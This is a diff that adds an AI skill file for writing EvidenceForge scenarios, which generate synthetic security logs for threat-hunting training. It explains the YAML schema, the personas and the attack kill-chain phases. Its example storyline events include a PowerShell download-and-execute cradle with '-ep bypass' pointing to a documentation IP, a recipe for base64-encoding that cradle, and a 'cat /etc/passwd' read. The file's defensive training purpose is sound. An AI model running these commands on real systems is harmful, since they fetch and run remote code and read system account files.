@@ -1,0 +1,370 @@
+---
+name: eforge-scenario
+description: >
+  Create EvidenceForge scenario YAML files for generating realistic synthetic security log datasets.
+  Use this skill whenever the user wants to create a new scenario, build a threat hunting exercise,
+  design an attack simulation, generate security training data, or create synthetic log datasets.
+  Also trigger when the user mentions "scenario", "attack scenario", "threat hunting dataset",
+  "security logs", "log generation", "EvidenceForge", or wants to simulate any kind of cyber attack
+  for training or testing purposes — even if they don't explicitly say "scenario".
+---
+
+# EvidenceForge Scenario Creator
+
+You are helping the user create an EvidenceForge scenario YAML file that will drive deterministic generation of realistic, cross-correlated security log datasets. The generated scenario feeds into the `eforge generate` CLI which produces logs across up to 7 formats (Windows Event, Zeek, eCAR, syslog, bash_history, Snort alerts, web access logs).
+
+The goal is a scenario that produces data useful for threat hunting training — realistic baseline noise mixed with a buried attack storyline that a hunter would need to find. The primary users are security professionals, though the data may be consumed by students and newcomers as well.
+
+## How This Works
+
+EvidenceForge uses a two-phase approach:
+1. **You** (the skill) help the user design the scenario through conversation
+2. **`eforge generate`** deterministically produces logs from that scenario — no LLM involved, fully deterministic
+
+The engine does NOT embellish or fill in details. Whatever you put in the scenario YAML is exactly what drives generation. This means you need to generate realistic, specific technical details: actual command lines, realistic file paths, proper IP addresses, correct process names. Vague or placeholder content produces vague logs.
+
+Your job is to understand what the user wants, ask smart questions to fill gaps, and produce a valid, technically detailed scenario YAML file — plus an ENVIRONMENT.md companion document.
+
+## Interview Flow
+
+Use a hybrid approach: let the user describe their idea first, then ask targeted follow-up questions to fill gaps. Don't present a checklist — have a conversation.
+
+If the user gives a rich description up front, extract as much as you can from it before asking questions. If they're vague ("I need some attack data"), guide them through the key decisions.
+
+### Key Topics to Cover
+
+**The attack story** — This is the heart of the scenario and shapes everything else. What attack technique or kill chain should be buried in the data? Suggest a realistic attack chain with specific MITRE ATT&CK techniques and let the user confirm or adjust. When referencing ATT&CK, always use both name and ID — for example, "OS Credential Dumping (T1003)" or "Exploit Public-Facing Application (T1190)".
+
+Multiple attackers and parallel attack paths are supported — for example, an external attacker doing credential stuffing while an insider exfiltrates data.
+
+**The environment** — What kind of organization? (corporate office, retail store, hospital, cloud-native startup, manufacturing plant, etc.) This determines the mix of users, systems, and network topology. A 5-person startup looks very different from a 500-person enterprise.
+
+**The network** — What does the network look like? Subnets, segments, where sensors are placed. The user might describe this conversationally, paste a text-based network diagram, or ask you to design a realistic network for the environment type. Network topology drives which connections are visible in the generated logs — without it, all connections are visible to all sensors.
+
+**Scale and duration** — How many users and systems? What time window? If the user is aiming for something very large, you can advise them if you think the scale might make the exercise unwieldy, but it's ultimately their call.
+
+**Log formats** — Which formats should be generated? Windows Event Security and Zeek are the most common pair. Add eCAR for EDR visibility, syslog + bash_history for Linux systems, Snort for IDS alerts, web_access for web server logs.
+
+**Difficulty** — How hard should the attack be to find? This affects baseline noise intensity, how spread out the attack events are, and whether the attacker uses obvious or subtle techniques.
+
+### Persona Selection
+
+EvidenceForge includes a library of 15 pre-built personas in the `personas/` directory (located alongside this skill file). Read the YAML files for full details when creating a scenario.
+
+| Persona | Work Hours | Risk Profile | Typical Role |
+|---------|-----------|--------------|-------------|
+| developer | 9am-6pm (lunch 12-1) | high | Software engineer |
+| sysadmin | 8am-6pm (lunch 12-1) | high | System administrator |
+| security_analyst | 9am-5pm (lunch 12-1) | high | SOC analyst |
+| analyst | 8am-5pm (lunch 12-1) | medium | Business analyst |
+| data_analyst | 8am-5pm (lunch 12-1) | medium | Data/BI analyst |
+| executive | 8am-7pm (lunch 12-1) | medium | C-suite / director |
+| project_manager | 8am-6pm (lunch 12-1) | medium | PM / scrum master |
+| accountant | 8am-5pm (lunch 12-1) | medium | Finance / accounting |
+| sales | 8am-6pm (lunch 12-1) | medium | Sales representative |
+| marketing | 9am-6pm (lunch 12-1) | medium | Marketing staff |
+| hr | 8am-5pm (lunch 12-1) | medium | Human resources |
+| help_desk | 8am-6pm (lunch 12-1) | medium | IT help desk |
+| legal_counsel | 9am-6pm (lunch 12-1) | low | Legal / compliance |
+| receptionist | 8am-5pm (lunch 12-1) | low | Front desk |
+| intern | 9am-5pm (lunch 12-1) | low | Intern / trainee |
+
+You can also define custom personas inline in the scenario if none of the pre-built ones fit (e.g., for a retail cashier or hospital nurse). Custom personas use the same schema.
+
+### Generating Realistic Users
+
+Every user should have a realistic, natural-sounding name by default. Think diverse, real-world names — not generic placeholders:
+
+Good: `marcus.chen`, `priya.patel`, `sarah.oconnell`, `diego.ramirez`, `aisha.johnson`
+Bad: `jsmith`, `user01`, `shift_manager`, `test_user`
+
+The username format should follow a consistent convention for the organization (e.g., `first.last`, `firstinitial.last`, `flast`). Pick one convention and stick with it across the scenario.
+
+**Service/system accounts** are the exception — names like `svc_backup`, `sql_agent`, or `ftp_service` are fine when needed for the story or environment realism. Only add these when they're needed.
+
+**External threat actors** should use the username `attacker` (or `attacker1`, `attacker2` for multiple). These are excluded from the ENVIRONMENT.md document given to students.
+
+## Scenario YAML Schema
+
+Read `references/scenario-reference.md` (located alongside this skill file) for the full schema reference. Here is the essential structure:
+
+```yaml
+version: "1.0"
+name: scenario-name              # Alphanumeric, dashes, underscores only
+description: |
+  Multi-line description of the scenario
+
+environment:
+  description: "Organization/environment description"
+
+  timezone:                       # Optional (defaults to UTC)
+    default: "America/New_York"
+    systems:                      # Optional pattern-based overrides (fnmatch glob)
+      "EU-*": "Europe/London"
+
+  users:
+    - username: marcus.chen
+      full_name: "Marcus Chen"
+      email: marcus.chen@example.com
+      persona: developer          # Must reference a persona name
+      primary_system: WS-DEV-01   # Optional, must reference a system hostname
+      enabled: true               # Default: true
+      groups: ["engineering"]     # Optional
+
+  systems:
+    - hostname: WS-DEV-01        # RFC 1123 compliant
+      ip: "10.0.1.10"            # IPv4 address
+      os: "Windows 10"           # OS determines which log formats are generated
+      type: workstation           # workstation | server | domain_controller
+      assigned_user: marcus.chen  # Optional
+      services: []               # Optional
+
+  groups:                         # Optional
+    - name: engineering
+      members: [marcus.chen]
+
+  network:                        # Optional but recommended for realism
+    segments:
+      - name: corporate_lan
+        cidr: "10.0.1.0/24"
+        description: "Corporate workstation network"
+        systems: [WS-DEV-01]     # Must reference existing hostnames
+    sensors:
+      - type: network             # network | ids | firewall
+        name: core-tap
+        monitoring_segments: [corporate_lan]
+        direction: bidirectional  # bidirectional | inbound | outbound
+        placement: span           # span (sees intra-segment) | tap (cross-segment only)
+        log_formats: [zeek_conn]
+
+personas:                         # Define inline or reference pre-built from personas/
+  - name: developer
+    description: "Software developer"
+    typical_activities:
+      - "Write and edit source code"
+      - "Run builds and tests"
+    work_hours: "9am-5pm (lunch 12pm-1pm)"
+    application_usage: ["VS Code", "Terminal", "Chrome"]
+    risk_profile: low             # low | medium | high
+
+time_window:
+  start: "2024-01-15T10:00:00Z"  # ISO 8601 UTC
+  duration: "8h"                  # OR use end: "2024-01-15T18:00:00Z"
+
+baseline_activity:
+  description: "Normal office activity"
+  intensity: medium               # low (~5 events/user/hr) | medium (~15) | high (~40)
+  variation: medium               # low (±10%) | medium (±25%) | high (±50%)
+
+storyline:                        # The attack events to bury in the data
+  - time: "+2h"                   # Relative offset from start, or absolute ISO 8601
+    actor: attacker               # Username or "attacker"
+    system: WS-DEV-01             # Must reference existing hostname
+    activity: "Description of what happens"
+    details:                      # Flexible dict — activity-specific fields
+      source_ip: "203.0.113.50"
+      command_line: "whoami"
+      technique: "T1033 - System Owner/User Discovery"
+
+output:
+  logs:
+    - format: windows_event_security
+    - format: zeek_conn
+    # Available: windows_event_security, zeek_conn, ecar, syslog,
+    #            bash_history, snort_alert, web_access
+  destination: "./output"
+  compression: false
+```
+
+### OS-Aware Log Routing
+
+The `os` field on systems determines which native log formats are generated:
+- **Windows** (Windows 10, Windows 11, Windows Server 2019, etc.) → Windows Event Security logs
+- **Linux** (Ubuntu, CentOS, Debian, RHEL, etc.) → syslog + bash_history
+- **eCAR** → Optional EDR/XDR layer, works on any OS (only emitted if in output logs list)
+- **Zeek, Snort** → Network-level, OS-agnostic (driven by network sensor configuration)
+- **web_access** → Generated for systems running web services
+
+### Validation Rules
+
+The scenario is validated before generation. Common issues to avoid:
+- Every `user.persona` must match a persona name (from inline personas or pre-built library)
+- Every `user.primary_system` must match a system hostname
+- Every `system.assigned_user` must match a username
+- Every storyline `actor` must be a username or "attacker"
+- Every storyline `system` must match a system hostname
+- Usernames, hostnames, and IPs must all be unique
+- Network segment `systems` must reference existing hostnames
+- Network sensor `monitoring_segments` must reference existing segment names
+
+## Building the Storyline
+
+The storyline is the most important part — it's what the threat hunter will be looking for. Think about it as a realistic attack narrative that follows a kill chain:
+
+1. **Initial Access (TA0001)** — How does the attacker get in? Phishing (T1566), Exploit Public-Facing Application (T1190), Valid Accounts (T1078)
+2. **Execution (TA0002)** — What runs? Command and Scripting Interpreter (T1059), Scheduled Task/Job (T1053)
+3. **Persistence (TA0003)** — How do they maintain access? Scheduled Task/Job (T1053), Create Account (T1136), Server Software Component (T1505)
+4. **Privilege Escalation (TA0004)** — How do they get higher privileges? Abuse Elevation Control Mechanism (T1548), Valid Accounts: Domain Accounts (T1078.002). On Linux, check for sudo misconfigurations, SUID binaries. On Windows, credential dumping leads to domain admin.
+5. **Defense Evasion (TA0005)** — How do they avoid detection? Impair Defenses (T1562), Indicator Removal (T1070). Consider disabling AV, clearing logs, timestomping.
+6. **Credential Access (TA0006)** — How do they get credentials? OS Credential Dumping (T1003), Unsecured Credentials (T1552), Kerberoasting (T1558.003)
+7. **Discovery (TA0007)** — What does the attacker enumerate? System Information Discovery (T1082), Account Discovery (T1087), Network Service Discovery (T1046)
+8. **Lateral Movement (TA0008)** — How do they spread? Remote Services (T1021), Use Alternate Authentication Material (T1550)
+9. **Collection & Exfiltration (TA0009/TA0010)** — What's the goal? Data from Local System (T1005), Exfiltration Over C2 Channel (T1041), Exfiltration Over Web Service (T1567)
+10. **Impact (TA0040)** — If applicable: Data Encrypted for Impact (T1486), Inhibit System Recovery (T1490)
+
+Not every scenario needs all phases — an insider threat won't have privilege escalation if they already have access, a ransomware attack emphasizes impact over exfiltration. But actively consider each phase and include it when it makes the attack realistic. Omitting privilege escalation or persistence from an external attacker scenario is a common gap that makes the storyline feel incomplete.
+
+When building storyline events, be technically specific because the engine uses these details directly:
+
+**For process execution events:**
+```yaml
+details:
+  process_name: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+  command_line: "powershell.exe -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.50/payload.ps1')\""
+  technique: "T1059.001 - PowerShell"
+```
+
+**For network connections:**
+```yaml
+details:
+  dst_ip: "198.51.100.10"
+  dst_port: 443
+  service: "https"
+  technique: "T1071.001 - Web Protocols"
+```
+
+**For authentication events:**
+```yaml
+details:
+  source_ip: "10.0.1.50"
+  logon_type: 3    # 3=network, 10=RDP, 2=interactive
+  technique: "T1078 - Valid Accounts"
+```
+
+**For Linux commands:**
+```yaml
+details:
+  command: "cat /etc/passwd"
+  technique: "T1087.001 - Account Discovery: Local Account"
+```
+
+Use RFC 5737 documentation IP ranges for external attacker IPs (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24). Use private ranges (10.x, 172.16-31.x, 192.168.x) for internal systems.
+
+### Encoded Payloads Must Be Real
+
+When a storyline event includes base64-encoded data, obfuscated commands, or any other encoded content, the encoding must be accurate and decodable — never fake strings that just "look like" base64. Use the Bash tool to produce real encodings.
+
+For PowerShell's `-EncodedCommand` flag (which expects UTF-16LE base64):
+```bash
+echo -n 'IEX (New-Object Net.WebClient).DownloadString("http://203.0.113.45/payload.ps1")' | iconv -t UTF-16LE | base64
+```
+
+For plain base64 (Linux commands, general obfuscation):
+```bash
+echo -n 'cat /etc/passwd' | base64
+```
+
+Always generate the encoded string via Bash and paste the real output into the scenario YAML. A threat hunter who decodes the base64 should find the actual command inside.
+
+For the `time` field, prefer relative offsets from the scenario start ("+15m", "+1h30m", "+2h") — they're easier to read and relocatable. Space events realistically: real attackers pause between steps, but don't drag reconnaissance over 6 hours either.
+
+## ENVIRONMENT.md — Student Context Document
+
+After generating the scenario YAML, also create an `ENVIRONMENT.md` file in the same directory as the scenario file. This document provides organizational context to the person analyzing the generated data — like a briefing packet a new SOC analyst would receive on their first day.
+
+**ENVIRONMENT.md must contain ZERO information about the attack storyline or any malicious/suspicious activity.** It is purely organizational context.
+
+### Content and Format
+
+```markdown
+# [Organization Name] — Environment Summary
+
+## Overview
+
+[Brief description of the organization, drawn from environment.description.]
+
+- **Timezone:** [timezone] ([UTC offset at scenario time])
+- **All log timestamps are in UTC.** Business hours are approximately HH:MM–HH:MM UTC.
+- **Data window:** [start] to [end] ([duration])
+- **Approximate environment size:** [N] users, [M] systems/devices
+
+## User Directory
+
+| Username | Full Name | Email | Role | Department | Primary System |
+|----------|-----------|-------|------|------------|----------------|
+| ... | ... | ... | ... | ... | ... |
+
+[Approximately N users shown. Full directory available on request.]
+
+## Systems Inventory
+
+| Hostname | IP Address | OS | Type | Services |
+|----------|------------|-----|------|----------|
+| ... | ... | ... | ... | ... |
+
+## Network Topology
+
+### Subnets
+
+| Segment | CIDR | Description |
+|---------|------|-------------|
+| ... | ... | ... |
+
+### Network Sensors
+
+| Sensor | Type | Placement | Monitors | Direction | Formats |
+|--------|------|-----------|----------|-----------|---------|
+| ... | ... | SPAN/TAP | [segments] | ... | ... |
+
+[Describe what each sensor can see in plain language.]
+
+## Available Data Sources
+
+| Log Format | Description |
+|------------|-------------|
+| ... | ... |
+```
+
+### Rules for Building ENVIRONMENT.md
+
+**User directory:**
+- Sort all listed users alphabetically by username
+- Include ALL users who appear in the storyline (their accounts show up in the attack data, so students need to be able to look them up)
+- Add 5–15 additional users from the background population, mixed in with the storyline users
+- For very large scenarios (50+ users), include a representative subset — not all of them
+- **Exclude all external threat actors** (username "attacker", "attacker1", etc.) — these should never appear in the document
+- Use natural role names, not raw persona codes. Persona "hr" becomes "Human Resources", "sysadmin" becomes "System Administrator", "developer" becomes "Software Engineer", etc.
+
+**Timezone:**
+- State the organization's timezone AND explicitly note that all log timestamps are in UTC
+- Include the UTC offset so there's no ambiguity (e.g., "Eastern Time (UTC-5)")
+- Show business hours converted to UTC
+
+**Network sensors:**
+- Describe what each sensor can see in straightforward terms (e.g., "Monitors all traffic between subnets via SPAN port on the core switch")
+- Do NOT editorialize about gaps or blind spots — just describe what each sensor covers
+
+**File location:**
+- Save as `ENVIRONMENT.md` in the same directory as the scenario YAML file
+- Name it `<scenario-name>-ENVIRONMENT.md` if the scenario name is available
+
+## Output Workflow
+
+After the interview, generate both files:
+
+1. **Scenario YAML** — Write to the user's chosen path (default: `scenarios/<scenario-name>.yaml`)
+2. **ENVIRONMENT.md** — Write alongside the scenario YAML
+3. **Validate** — Run `uv run eforge validate <scenario-file>` to check schema and cross-references
+4. If validation fails, fix the issues and re-validate
+5. **Summarize** what was created: environment size, time window, attack narrative overview, log formats
+
+If the user wants to immediately generate logs, suggest using `/eforge generate` or running `uv run eforge generate <scenario-file>`.
+
+When generation completes, the output directory will contain a `GROUND_TRUTH.md` file with the full attack timeline, IOCs, and answer key. Let the user know this exists and where to find it.
+
+## Future Enhancements
+
+These features are planned but not yet implemented:
+- Network diagram ingestion (Mermaid, Graphviz) to auto-generate network topology
+- Full user directory export as a separate CSV file for large scenarios
+- Authentication and naming convention documentation in ENVIRONMENT.md
